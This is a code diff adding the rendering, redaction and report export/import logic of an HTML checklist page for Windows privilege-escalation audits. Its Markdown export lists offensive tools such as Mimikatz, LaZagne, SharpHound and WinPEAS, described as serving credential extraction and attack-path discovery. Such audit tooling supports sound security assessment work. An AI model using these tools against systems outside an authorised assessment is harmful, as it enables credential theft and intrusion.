+}
+function manualRedact(noteKey) {
+  const el = document.getElementById('note-' + noteKey);
+  if (!el) return;
+  const s = el.selectionStart, e = el.selectionEnd;
+  if (s === e) { alert('Select the text you want to redact first, then click Redact Selection.'); return; }
+  el.value = el.value.substring(0,s) + snip(el.value.substring(s,e)) + el.value.substring(e);
+  notes[noteKey] = el.value;
+  save();
+}
+function exportNote(raw) {
+  const text = (raw||'').trim() || '(no output recorded)';
+  return redactEnabled ? redactOutput(text) : text;
+}
+
+// ── Build step HTML ────────────────────────────────────
+function buildStep(s, n, isToolStep) {
+  const key = s.id !== undefined ? s.id : s.tid;
+  const done = !!state[key];
+  const privMode = s.priv || 'low';
+
+  // Output fields
+  let outHtml = '<div class="out-wrap">';
+  if (privMode === 'both') {
+    const nkL = key+'_low', nkR = key+'_admin';
+    const vL = (notes[nkL]||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    const vR = (notes[nkR]||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    outHtml += `<div class="out-block"><div class="out-label" style="display:flex;align-items:center;justify-content:space-between">Output <span class="low-badge">Low-priv</span><button class="cpbtn" onclick="manualRedact('${nkL}')">Redact selection</button></div><textarea class="output-field" id="note-${nkL}" placeholder="Paste output from low-privileged user..." oninput="noteChange('${nkL}')">${vL}</textarea></div>`;
+    outHtml += `<div class="out-block"><div class="out-label" style="display:flex;align-items:center;justify-content:space-between">Output <span class="root-badge">Admin</span><button class="cpbtn" onclick="manualRedact('${nkR}')">Redact selection</button></div><textarea class="output-field" id="note-${nkR}" placeholder="Paste output from administrator..." oninput="noteChange('${nkR}')">${vR}</textarea></div>`;
+  } else if (privMode === 'admin') {
+    const nk = key+'_admin';
+    const v = (notes[nk]||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    outHtml += `<div class="out-block"><div class="out-label" style="display:flex;align-items:center;justify-content:space-between">Output <span class="root-badge">Admin</span><button class="cpbtn" onclick="manualRedact('${nk}')">Redact selection</button></div><textarea class="output-field" id="note-${nk}" placeholder="Paste output from administrator..." oninput="noteChange('${nk}')">${v}</textarea></div>`;
+  } else {
+    const nk = key+'_low';
+    const v = (notes[nk]||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    outHtml += `<div class="out-block"><div class="out-label" style="display:flex;align-items:center;justify-content:space-between">Output <span class="low-badge">Low-priv</span><button class="cpbtn" onclick="manualRedact('${nk}')">Redact selection</button></div><textarea class="output-field" id="note-${nk}" placeholder="Paste output here..." oninput="noteChange('${nk}')">${v}</textarea></div>`;
+  }
+  outHtml += '</div>';
+
+  const badge = privMode==='admin' ? '<span class="root-badge">Admin required</span>'
+              : privMode==='both'  ? '<span class="root-badge">Run as both</span>'
+              : '';
+  const numLabel = isToolStep ? '' : `<span class="num">${String(n).padStart(2,'0')}</span>`;
+  const whyHtml  = s.why  ? `<div class="why-text">${s.why}</div>` : '';
+  const lookHtml = s.look ? `<div class="look">${s.look}</div>` : '';
+
+  let cmdsHtml = '<div class="cmds">';
+  (s.cmds||[]).forEach((item, idx) => {
+    if (item.comment) {
+      cmdsHtml += `<div class="cmt"># ${item.comment}</div>`;
+    } else {
+      const ckey = key + '_' + idx;
+      const cdone = !!cmdState[ckey];
+      const esc = item.c.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+      cmdsHtml += `<div class="cmd-row"><div class="cmd-cb${cdone?' on':''}" id="ccb-${ckey}" onclick="tickCmd('${key}',${idx})"></div><code class="code${cdone?' cmd-done':''}" id="ccode-${ckey}">${esc}</code><button class="cpbtn" data-ckey="${ckey}" onclick="cpCmd(this)">Copy</button></div>`;
+    }
+  });
+  cmdsHtml += '</div>';
+
+  return `<div class="step${done?' done':''}" id="row-${key}">
+<div class="step-cb${done?' on':''}" id="scb-${key}" onclick="tickStep('${key}')"></div>
+${numLabel}
+<div class="body">
+<div class="stitle" onclick="tickStep('${key}')">${s.title}${badge}</div>
+${whyHtml}${lookHtml}
+${cmdsHtml}
+${outHtml}
+</div></div>`;
+}
+
+// ── Render ─────────────────────────────────────────────
+function render() {
+  const el = document.getElementById('list');
+  let html = '';
+  html += '<div class="section-hdr">Tools</div>';
+  TOOLS_DATA.forEach(t => { if (!t.tid) return; html += buildStep(t, 0, true); });
+  let n = 0;
+  DATA.forEach(s => {
+    if (s.section) {
+      html += `<div class="section-hdr">${s.section}</div>`;
+      if (s.section === 'Additional Checks') html += `<div id="custom-checks"></div>`;
+      return;
+    }
+    n++;
+    html += buildStep(s, n, false);
+  });
+  el.innerHTML = html;
+}
+
+function renderRefs() {
+  const el = document.getElementById('refs-list');
+  let html = '';
+  REFS.forEach(cat => {
+    html += `<div style="margin-bottom:14px"><div style="font-size:11px;font-weight:500;color:var(--text2);margin-bottom:6px">${cat.cat}</div><div style="display:flex;flex-direction:column;gap:4px">`;
+    cat.items.forEach(ref => {
+      html += `<div style="display:flex;gap:8px;align-items:baseline;flex-wrap:wrap"><a href="${ref.url}" target="_blank" style="font-size:12px;color:var(--green);text-decoration:none;white-space:nowrap;flex-shrink:0">${ref.title}</a><span style="font-size:11px;color:var(--text3)">— ${ref.desc}</span></div>`;
+    });
+    html += `</div></div>`;
+  });
+  el.innerHTML = html;
+}
+
+// ── Markdown export ────────────────────────────────────
+function exportMd() {
+  const now = new Date();
+  const ts = now.toISOString().replace('T',' ').substring(0,16);
+  let md = `# Windows Audit Checklist — Report\n\n`;
+  md += `**Date:** ${ts}\n\n`;
+  const totalItems = DATA.filter(s=>s.id).length + TOOLS_DATA.filter(t=>t.tid).length;
+  const doneItems = [...DATA,...TOOLS_DATA].filter(s=>(s.id||s.tid)&&state[s.id||s.tid]).length;
+  md += `**Progress:** ${doneItems} / ${totalItems} complete\n\n`;
+  md += `**Credential redaction:** ${redactEnabled?'Enabled — sensitive values have been redacted':'Disabled — output exported as-is'}\n\n---\n\n`;
+
+  md += `## Tools\n\n`;
+  md += `| Tool | Description | URL |\n|---|---|---|\n`;
+  md += `| WinPEAS    | Automated Windows privilege escalation sweep | https://github.com/peass-ng/PEASS-ng |\n`;
+  md += `| PowerUp    | PowerShell privilege escalation checker | https://github.com/PowerShellMafia/PowerSploit |\n`;
+  md += `| Seatbelt   | Host triage and situational awareness | https://github.com/GhostPack/Seatbelt |\n`;
+  md += `| SharpHound | Active Directory attack path collection | https://github.com/BloodHoundAD/SharpHound |\n`;
+  md += `| Mimikatz   | Credential extraction | https://github.com/gentilkiwi/mimikatz |\n`;
+  md += `| LaZagne    | Application credential recovery | https://github.com/AlessandroZ/LaZagne |\n\n`;
+
+  TOOLS_DATA.forEach(t => {
+    if (!t.tid) return;
+    const checked = state[t.tid] ? '[x]' : '[ ]';
+    md += `### ${checked} Tool — ${t.title}\n\n`;
+    if (t.why) md += `**Why:** ${t.why}\n\n`;
+    const cmdsOnly = (t.cmds||[]).filter(i=>i.c);
+    if (cmdsOnly.length) {
+      md += `**Commands:**\n\n`;
+      cmdsOnly.forEach((item,idx) => {
+        const run = cmdState[t.tid+'_'+idx] ? '[x]' : '[ ]';
+        md += `- ${run} \`${item.c}\`\n`;
+      });
+      md += '\n';
+    }
+    const pm = t.priv||'low';
+    if (pm==='both') {
+      md += `**Output (low-priv):**\n\n\`\`\`\n${exportNote(notes[t.tid+'_low'])}\n\`\`\`\n\n`;
+      md += `**Output (admin):**\n\n\`\`\`\n${exportNote(notes[t.tid+'_admin'])}\n\`\`\`\n\n`;
+    } else {
+      const nk = t.tid+(pm==='admin'?'_admin':'_low');
+      md += `**Output ${pm==='admin'?'(admin)':'(low-priv)'}:**\n\n\`\`\`\n${exportNote(notes[nk])}\n\`\`\`\n\n`;
+    }
+  });
+
+  let currentSection='', stepNum=0;
+  DATA.forEach(s => {
+    if (s.section) { currentSection=s.section; md+=`## ${s.section}\n\n`; return; }
+    stepNum++;
+    const checked = state[s.id] ? '[x]' : '[ ]';
+    md += `### ${checked} Step ${String(stepNum).padStart(2,'0')} — ${s.title}\n\n`;
+    if (s.why)  md += `**Why:** ${s.why}\n\n`;
+    if (s.look) md += `**Look for:** ${s.look}\n\n`;
+    const pm = s.priv||'low';
+    md += `**Access:** ${pm==='admin'?'Admin required':pm==='both'?'Run as both':'Low-priv'}\n\n`;
+    const cmdsOnly = s.cmds.filter(i=>i.c);
+    if (cmdsOnly.length) {
+      md += `**Commands:**\n\n`;
+      cmdsOnly.forEach((item,idx) => {
+        const run = cmdState[s.id+'_'+idx] ? '[x]' : '[ ]';
+        md += `- ${run} \`${item.c}\`\n`;
+      });
+      md += '\n';
+    }
+    if (pm==='both') {
+      md += `**Output (low-priv):**\n\n\`\`\`\n${exportNote(notes[s.id+'_low'])}\n\`\`\`\n\n`;
+      md += `**Output (admin):**\n\n\`\`\`\n${exportNote(notes[s.id+'_admin'])}\n\`\`\`\n\n`;
+    } else {
+      const nk = s.id+(pm==='admin'?'_admin':'_low');
+      md += `**Output ${pm==='admin'?'(admin)':'(low-priv)'}:**\n\n\`\`\`\n${exportNote(notes[nk])}\n\`\`\`\n\n`;
+    }
+  });
+
+  if (customChecks.length > 0) {
+    md += `## Additional Checks\n\n`;
+    customChecks.forEach((cc, idx) => {
+      const checked = cc.done ? '[x]' : '[ ]';
+      md += `### ${checked} Custom ${String(idx+1).padStart(2,'0')} — ${cc.title||'(untitled)'}\n\n`;
+      md += `**Notes / Output:**\n\n\`\`\`\n${exportNote(cc.note)}\n\`\`\`\n\n`;
+    });
+  }
+
+  md += `---\n\n## References\n\n`;
+  REFS.forEach(cat => {
+    md += `### ${cat.cat}\n\n`;
+    cat.items.forEach(ref => { md += `- **[${ref.title}](${ref.url})** — ${ref.desc}\n`; });
+    md += '\n';
+  });
+
+  const blob = new Blob([md], {type:'text/markdown'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  const dateSuffix = now.toISOString().substring(0,10);
+  a.download = `windows_audit_${dateSuffix}${redactEnabled?'_redacted':'_raw'}.md`;
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+// ── PDF export ─────────────────────────────────────────
+function exportPdf() {
+  const date = new Date().toISOString().substring(0,10);
+  const suffix = redactEnabled ? '_redacted' : '_raw';
+  const prevTitle = document.title;
+  document.title = `windows_audit_${date}${suffix}`;
+  const replacements = [];
+  document.querySelectorAll('textarea.output-field').forEach(ta => {
+    const raw = ta.value || '';
+    const content = redactEnabled ? (redactOutput(raw)||raw) : raw;
+    const div = document.createElement('div');
+    div.setAttribute('data-print-field','1');
+    div.textContent = content || '(no output recorded)';
+    ta.parentNode.insertBefore(div, ta);
+    ta.style.display = 'none';
+    replacements.push({div, ta});
+  });
+  const style = document.createElement('style');
+  style.id = 'print-inject';
+  style.textContent = `@media print{[data-print-field]{display:block!important;white-space:pre-wrap!important;word-break:break-all!important;font-family:'Fira Mono','Consolas',monospace!important;font-size:10px!important;line-height:1.5!important;padding:6px 8px!important;border:0.5px solid #ccc!important;border-radius:4px!important;background:#f7f7f5!important;color:#1a1a18!important;height:auto!important;min-height:0!important;max-height:none!important;overflow:visible!important;page-break-inside:auto!important;}}`;
+  document.head.appendChild(style);
+  setTimeout(() => {
+    window.print();
+    document.title = prevTitle;
+    replacements.forEach(({div,ta}) => { ta.style.display=''; div.remove(); });
+    const injected = document.getElementById('print-inject');
+    if (injected) injected.remove();
+  }, 120);
+}
+
+// ── Import ─────────────────────────────────────────────
+function importMd(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const text = e.target.result;
+    let imported = 0;
+    const stepRe = /###\s+\[x\]\s+(?:Step\s+\d+\s+—\s+(.+)|Tool\s+—\s+(.+))/g;
+    let m;
+    while ((m = stepRe.exec(text)) !== null) {
+      const title = (m[1]||m[2]).trim();
+      const found = [...DATA,...TOOLS_DATA].find(s => s.title && s.title.trim()===title);
+      if (found) { const k=found.id!==undefined?found.id:found.tid; state[k]=true; imported++; }
+    }
+    const cmdRe = /^-\s+\[x\]\s+`(.+)`$/gm;
+    while ((m = cmdRe.exec(text)) !== null) {
+      const cmd = m[1].trim();
+      for (const [ckey,val] of Object.entries(CMD_STORE)) {
+        if (val.trim()===cmd) { cmdState[ckey]=true; break; }
+      }
+    }
+    const outRe = /###\s+(?:\[.\])\s+(?:Step\s+\d+\s+—\s+(.+)|Tool\s+—\s+(.+))[\s\S]*?\*\*Output\s*\(?(low-priv|admin)\)?[:\s]*\*\*\s*\n+```\n([\s\S]*?)```/g;
+    while ((m = outRe.exec(text)) !== null) {
+      const title = (m[1]||m[2]).trim();
+      const type = m[3];
+      const content = m[4].trim();
+      if (content==='(no output recorded)') continue;
+      const found = [...DATA,...TOOLS_DATA].find(s => s.title&&s.title.trim()===title);
+      if (found) {
+        const k = found.id!==undefined?found.id:found.tid;
+        notes[k+(type==='admin'?'_admin':'_low')] = content;
+      }
+    }
+    const customRe = /###\s+(\[.\])\s+Custom\s+\d+\s+—\s*(.*)\n[\s\S]*?\*\*Notes \/ Output:\*\*\s*\n+```\n([\s\S]*?)```/g;
+    customChecks = [];
+    while ((m = customRe.exec(text)) !== null) {
+      const done = m[1]==='[x]';
+      const title = m[2].trim();
+      const note = m[3].trim()==='(no output recorded)' ? '' : m[3].trim();
+      customChecks.push({title,note,done});
+    }
+    save(); render(); renderCustomChecks(); updateBar();
+    Object.entries(notes).forEach(([nk,val]) => { const el=document.getElementById('note-'+nk); if(el) el.value=val; });
+    Object.entries(state).forEach(([k,v]) => {
+      if(!v) return;
+      const row=document.getElementById('row-'+k); const cb=document.getElementById('scb-'+k);
+      if(row) row.classList.add('done'); if(cb) cb.classList.add('on');
+    });
+    Object.entries(cmdState).forEach(([ckey,v]) => {
+      if(!v) return;
+      const cb=document.getElementById('ccb-'+ckey); const code=document.getElementById('ccode-'+ckey);
+      if(cb) cb.classList.add('on'); if(code) code.classList.add('cmd-done');
+    });
+    alert(`Import complete. Restored ${imported} step checkboxes, ${Object.keys(notes).length} output fields, and ${customChecks.length} additional checks.`);
+  };
+  reader.readAsText(file);
+  event.target.value = '';
+}
+
+load(); render(); renderRefs(); renderCustomChecks(); updateBar();
+</script>
+</body>
+</html>
